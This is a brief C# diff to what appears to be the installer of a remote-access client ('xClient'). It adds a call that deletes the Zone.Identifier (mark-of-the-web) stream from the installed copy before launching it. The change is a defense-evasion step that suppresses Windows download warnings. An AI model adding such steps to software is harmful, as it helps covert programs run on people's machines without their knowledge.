@@ -4,6 +4,7 @@ using System.IO;
 using System.Threading;
 using xClient.Config;
 using xClient.Core.Data;
+using xClient.Core.Helper;
 using xClient.Core.Networking;
 
 namespace xClient.Core.Installation
@@ -64,6 +65,8 @@ namespace xClient.Core.Installation
                 {
                 }
             }
+
+            FileHelper.DeleteZoneIdentifier(ClientData.InstallPath);
 
             //start file
             var startInfo = new ProcessStartInfo
